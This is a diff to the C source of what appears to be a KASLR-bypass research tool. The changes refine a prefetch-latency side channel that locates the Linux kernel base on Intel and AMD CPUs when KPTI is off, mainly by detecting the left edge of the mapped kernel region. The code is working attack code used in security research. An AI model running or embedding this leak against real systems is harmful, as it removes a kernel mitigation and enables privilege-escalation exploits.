@@ -28,10 +28,17 @@
 // Unlike EntryBleed (CVE-2022-4543), this technique does not require
 // kernel-version-specific offsets.
 //
+// Both strategies find the base as the LEFT EDGE of the contiguous mapped
+// kernel region — the first mapped slot — not the extremum within it. The base
+// slot (head/entry text) carries a weaker signal than the hot kernel body, so
+// keying off the extremum (or a body-tuned threshold) reports the base one slot
+// high; edge detection to the unmapped->mapped transition recovers it.
+//
 // Intel strategy:
-//   Mapped kernel pages resolve faster (TLB hit) than unmapped ones.
-//   The kernel base is the slot with the minimum prefetch latency.
-//   Per-slot minimums across iterations are used.
+//   Mapped kernel pages resolve faster (TLB hit) than unmapped ones. The global
+//   minimum is a seed guaranteed to lie inside the kernel; the base is found by
+//   walking LEFT from it to the unmapped->mapped transition. Per-slot minimums
+//   across iterations are used.
 //
 // AMD strategy:
 //   The timing signal is inverted: mapped pages produce higher latency
@@ -39,12 +46,12 @@
 //   quickly NOPped). Per-slot sums across iterations are used because
 //   rdtscp on some AMD CPUs only resolves to ~36-cycle quanta (min and
 //   median collapse to a single quantum; sums preserve the slow-vs-fast
-//   proportion as a continuous value). The kernel base is found by
-//   threshold detection: the median sum establishes the unmapped
-//   baseline, and the kernel region is the leftmost cluster of slots
-//   whose sums exceed 1.5x the median. The confirmation window filters
-//   PDP entry boundary artifacts (~1.2x median, 7 slots wide every 128
-//   slots) and isolated scheduling outliers.
+//   proportion as a continuous value). The kernel region is the leftmost
+//   cluster of slots whose sums exceed 1.5x the median (a confirmation window
+//   filters PDP entry boundary artifacts ~1.2x median, 7 slots wide every 128
+//   slots, and isolated scheduling outliers); the left edge is then walked out
+//   to the baseline transition with a looser 1.25x bound to recover the weaker
+//   base slot.
 //
 // Limitations:
 //   - Requires KPTI to be disabled (no signal through KPTI page tables).
@@ -195,22 +202,54 @@ static void dump_timings(const uint64_t *times, const char *stat) {
 }
 
 // ---------------------------------------------------------------------------
-// Intel strategy: find the single slot with the lowest prefetch time.
-// Mapped pages resolve faster (TLB hit) on Intel.
+// qsort comparator over per-slot times (baseline / median estimation).
+// ---------------------------------------------------------------------------
+static int cmp_u64(const void *a, const void *b) {
+  uint64_t va = *(const uint64_t *)a;
+  uint64_t vb = *(const uint64_t *)b;
+  return (va > vb) - (va < vb);
+}
+
+// ---------------------------------------------------------------------------
+// Intel strategy: left-edge detection.
+//
+// Mapped pages resolve FASTER on Intel, so the kernel text is a contiguous run
+// of low-latency slots. The kernel BASE is the LEFT EDGE of that run — NOT the
+// global minimum, which lands on the hottest body page (usually a few slots in,
+// where frequently-executed .text lives) and so reports the base one or more
+// slots high.
+//
+// The global minimum is still a sound SEED: it is guaranteed to sit inside the
+// mapped kernel, because min-over-iterations removes upward scheduler noise, so
+// no unmapped slot reads faster than a mapped one. From that seed, walk LEFT to
+// the unmapped -> mapped transition. The stop bound is the midpoint between the
+// unmapped baseline (median) and the fastest mapped slot, so it adapts to the
+// signal magnitude, and an unmapped slot (at ~baseline) never crosses it — the
+// walk halts exactly at the base and can never place it below _text.
 // ---------------------------------------------------------------------------
 static unsigned long find_base_intel(const uint64_t *times) {
-  uint64_t min_time = ~(uint64_t)0;
-  unsigned long best = 0;
-  unsigned long idx;
+  uint64_t sorted[NUM_SLOTS];
+  memcpy(sorted, times, sizeof(sorted));
+  qsort(sorted, NUM_SLOTS, sizeof(uint64_t), cmp_u64);
+  uint64_t baseline = sorted[NUM_SLOTS / 2];
 
+  uint64_t min_time = ~(uint64_t)0;
+  unsigned long seed = 0, idx;
   for (idx = 0; idx < NUM_SLOTS; idx++) {
     if (times[idx] < min_time) {
       min_time = times[idx];
-      best = idx;
+      seed = idx;
     }
   }
 
-  return KERNEL_VIRT_TEXT_MIN + best * STEP;
+  /* midpoint(baseline, fastest): below it a slot is mapped, at/above it is the
+   * unmapped baseline. min_time <= baseline always, so the subtraction is safe.
+   */
+  uint64_t edge_bound = baseline - (baseline - min_time) / 2;
+  while (seed > 0 && times[seed - 1] < edge_bound)
+    seed--;
+
+  return KERNEL_VIRT_TEXT_MIN + seed * STEP;
 }
 
 // ---------------------------------------------------------------------------
@@ -230,18 +269,16 @@ static unsigned long find_base_intel(const uint64_t *times) {
 //    CONFIRM_K of the next CONFIRM_M slots exceed the threshold.
 //    This confirmation requirement filters isolated scheduling
 //    outliers (which spike a single slot to 10x+).
+// 4. Walk that cluster's LEFT EDGE out to the baseline transition with a
+//    looser 1.25x bound. The strict threshold is tuned to the kernel body and
+//    can drop the weaker base slot; the looser walk recovers it, and unmapped
+//    slots (~1.0x) never cross it, so it never places the base below _text.
 //
 // Returns 0 if no confirmed cluster is found (attack fails on this
 // CPU, or KPTI-like mitigation is active).
 // ---------------------------------------------------------------------------
 #define CONFIRM_K 5
 #define CONFIRM_M 8
-
-static int cmp_u64(const void *a, const void *b) {
-  uint64_t va = *(const uint64_t *)a;
-  uint64_t vb = *(const uint64_t *)b;
-  return (va > vb) - (va < vb);
-}
 
 static unsigned long find_base_amd(const uint64_t *times) {
   uint64_t sorted[NUM_SLOTS];
@@ -269,8 +306,20 @@ static unsigned long find_base_amd(const uint64_t *times) {
       if (times[idx + j] > threshold)
         count++;
     }
-    if (count >= CONFIRM_K)
+    if (count >= CONFIRM_K) {
+      /* The strict 1.5x threshold is tuned to the kernel BODY (~1.7x baseline)
+       * and can miss the BASE slot, whose mapped signal is weaker (head/entry
+       * text is less hot): it clears the unmapped baseline decisively but sits
+       * only marginally above the cluster threshold, so a noisy pass drops it
+       * and the cluster starts one slot high. Walk the left edge out to the
+       * baseline transition with a looser baseline-relative bound (1.25x):
+       * unmapped slots sit at ~1.0x and never cross it, so the walk recovers
+       * the base slot and halts at _text without ever going below it. */
+      uint64_t edge_bound = median + median / 4;
+      while (idx > 0 && times[idx - 1] > edge_bound)
+        idx--;
       return KERNEL_VIRT_TEXT_MIN + idx * STEP;
+    }
   }
 
   return 0;
@@ -281,7 +330,7 @@ static unsigned long find_base_amd(const uint64_t *times) {
 // ---------------------------------------------------------------------------
 #define NUM_PASSES 7
 
-static unsigned long majority_vote(int cpu_vendor) {
+static unsigned long majority_vote(int cpu_vendor, int *n_found) {
   unsigned long results[NUM_PASSES];
   uint64_t times[NUM_SLOTS];
   int i;
@@ -303,6 +352,17 @@ static unsigned long majority_vote(int cpu_vendor) {
 
     if (verbose)
       fprintf(stderr, "# pass %d: 0x%lx\n", i, results[i]);
+  }
+
+  /* Count passes that located a mapped-kernel cluster (non-zero). This lets the
+   * caller distinguish a total ABSENCE of signal (no cluster in any pass — the
+   * scan saw only baseline and page-table-boundary timing) from an UNSTABLE one
+   * (candidates found but scattered by noise, so no majority forms). */
+  if (n_found) {
+    *n_found = 0;
+    for (i = 0; i < NUM_PASSES; i++)
+      if (results[i])
+        (*n_found)++;
   }
 
   /* Boyer-Moore majority vote */
@@ -361,16 +421,29 @@ static unsigned long get_kernel_addr_prefetch(void) {
 
   pin_cpu(0);
 
-  unsigned long addr = majority_vote(cpu);
+  int n_found = 0;
+  unsigned long addr = majority_vote(cpu, &n_found);
 
   if (!addr) {
-    kasld_err("majority vote failed across %d passes", NUM_PASSES);
+    if (n_found == 0)
+      kasld_err(
+          "no kernel-text signal: the scan found no mapped-kernel cluster, "
+          "only the unmapped baseline and page-table-boundary timing. This "
+          "CPU may not leak the kernel base through prefetch page-walk "
+          "latency.");
+    else
+      kasld_err(
+          "unstable prefetch signal: %d/%d passes located a candidate but "
+          "none held a majority (scheduler / CPU-frequency / thermal noise; "
+          "a quieter run may resolve it).",
+          n_found, NUM_PASSES);
     return 0;
   }
 
   if (kasld_addr_is_kernel_text(addr))
     return addr;
 
+  kasld_err("discarding candidate 0x%lx: outside the kernel-text window", addr);
   return 0;
 }
 
@@ -381,10 +454,8 @@ int main(int argc, char *argv[]) {
   kasld_info("trying prefetch side-channel ...");
 
   unsigned long addr = get_kernel_addr_prefetch();
-  if (!addr) {
-    kasld_err("prefetch side-channel failed (not exploitable?)");
+  if (!addr) /* get_kernel_addr_prefetch already reported the specific reason */
     return 0;
-  }
 
   kasld_info("possible kernel base: %lx", addr);
   /* The prefetch latency scan locates the kernel image BASE (the lowest mapped
